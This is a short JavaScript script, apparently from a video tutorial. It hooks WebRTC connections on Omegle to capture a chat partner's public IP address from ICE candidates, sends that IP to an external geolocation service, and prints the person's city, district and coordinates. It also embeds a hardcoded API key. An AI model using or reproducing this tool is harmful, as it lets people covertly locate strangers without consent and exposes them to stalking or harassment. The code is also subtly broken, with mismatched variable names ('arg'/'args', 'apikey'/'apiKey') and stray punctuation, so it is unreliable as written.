// 1. get IP address using RTCPeerConnection web API
// 2. get location data using an external IP Geolocation API
//Video link: https://youtu.be/fN9cWpY5zUc


const apikey = "dab3514dc7ec48eeb1c95c8bd81cd483";
window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
// PART 1. parsing the IP address
//RTCPeerConnection allows us to open, maintain, close a connection on Omegle
window.RTCPeerConnection = function (...args) 
{
    const pc = new window.oRTCPeerConnection(...arg);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function (iceCandidate, ...rest) 
    {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") 
        {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
}

// PART 2. Now Get location data

const getLocation = async (ip) =>
{
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;;

    await fetch(url).then((response) =>
        response.json().then((json) => 
        {
            const output = `
                ------------------------
                country: ${json.country_name}
                State: ${json.state_prov}
                City: ${json.city}
                District: ${json.district}
                Lat / Long: ${json.latitude}, ${json.longitude})
                -------------------------
                `;
            console.log(output);
        })
    );
};